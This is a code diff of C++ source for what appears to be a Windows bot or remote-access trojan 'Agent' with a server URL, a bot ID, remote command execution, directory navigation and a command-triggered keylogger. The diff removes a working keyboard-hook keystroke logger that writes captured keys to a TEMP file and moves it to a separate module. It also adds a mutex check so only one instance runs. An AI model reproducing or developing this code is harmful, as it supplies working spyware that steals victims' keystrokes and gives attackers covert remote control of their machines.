@@ -1,68 +1,16 @@
 #include "agent.h"
 #include "http.h"
+#include "crypt.h"
+#include "threads.h"
+#include "keylogger.h"
 
 LRESULT WINAPI hook_keylogger(int nCode, WPARAM wParam, LPARAM lParam);
 FILE * keylogger_output_stream;
-int keysPressed;
 std::string keylogger_file;
-HHOOK h_keyboard_hookook;
 bool keylogger_state;
 
-
-/*
-Keylogger function
-*/
-LRESULT CALLBACK hook_keylogger(int nCode, WPARAM wParam, LPARAM lParam)
-{
-	if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN)))
-	{
-		KBDLLHOOKSTRUCT hooked_key = *((KBDLLHOOKSTRUCT*)lParam);
-		DWORD dwMsg = 1;
-		dwMsg += hooked_key.scanCode << 16;
-		dwMsg += hooked_key.flags << 24;
-		char lpszKeyName[1024] = { 0 };
-		lpszKeyName[0] = '[';
-
-		int i = GetKeyNameText(dwMsg, (lpszKeyName + 1), 0xFF) + 1;
-		int key = hooked_key.vkCode;
-		lpszKeyName[i] = ']';
-		if (key >= 'A' && key <= 'Z')
-		{
-			//if caps look is on,print upper case letters
-			if (!GetKeyState(VK_CAPITAL))
-				key += 0x20;
-
-			fprintf(keylogger_output_stream, "%c", key);
-		}
-		else
-			fprintf(keylogger_output_stream, "%s", lpszKeyName);
-		keysPressed++;
-		if (keysPressed >= 32) {
-			fprintf(keylogger_output_stream, "\n");
-			keysPressed = 0;
-		}
-	}
-	return CallNextHookEx(h_keyboard_hookook, nCode, wParam, lParam);
-}
-
-void WINAPI WinAPIextention()
-{
-	HINSTANCE hook_instance;
-	hook_instance = GetModuleHandle(NULL);
-	HOOKPROC hook_procedure = hook_keylogger;
-	h_keyboard_hookook = SetWindowsHookEx(WH_KEYBOARD, hook_procedure, hook_instance, GetCurrentThreadId());
-
-	MSG message;
-	while (GetMessage(&message, NULL, 0, 0) && (keylogger_state == true))
-	{
-		TranslateMessage(&message);
-		DispatchMessage(&message);
-	}
-	
-	UnhookWindowsHookEx(h_keyboard_hookook);
-	fclose(keylogger_output_stream);
-}
-
+// threads structure
+THREAD threads[MAXTHREADS];
 
 using namespace std;
 
@@ -85,7 +33,6 @@ Agent::Agent(const std::string& _server_url, const std::string& _botid, const un
 	user_agent = _user_agent;
 	running = false;
 	keylogger_state = false;
-	keysPressed = 0;
 	if (_keylogger_file.empty()) {
 		char* pPath;
 		pPath = getenv("TEMP");
@@ -194,7 +141,7 @@ void Agent::keylogger(bool state)
 			fprintf(keylogger_output_stream, "Keylogger file\n--------------\n");
 			// ask to the second thread to initiate the keylogger process
 			keylogger_state = true;
-			keylogger_task = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)WinAPIextention, 0, 0, 0);
+			keylogger_task = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)WinAPIextentionK, (LPVOID)&keylogger_state, 0, 0);
 			send_output("Keylogger is started ...");
 			return;
 		}
@@ -435,10 +382,11 @@ void Agent::open(const std::string& args) {
 
 
 void Agent::cd(const std::string& newdir) {
-
-	_chdir(newdir.c_str());
-
-	send_output("Entering " + get_wd());
+	int ret = _chdir(newdir.c_str());
+	if (ret == 0)
+		send_output("Entering " + get_wd());
+	else
+		send_output("Can't go to " + newdir + ". Stay in " + get_wd());
 }
 
 
@@ -571,7 +519,12 @@ void Agent::execute(const std::string& commandline) {
 }
 
 void Agent::run() {
-	
+	const char MutexID[] = MUTEXID;
+
+	// check if this exe is running already
+	if (WaitForSingleObject(CreateMutex(NULL, FALSE, MutexID), 30000) == WAIT_TIMEOUT)
+		ExitProcess(EXIT_FAILURE);
+
 	running = true;
 
 	while (running) {
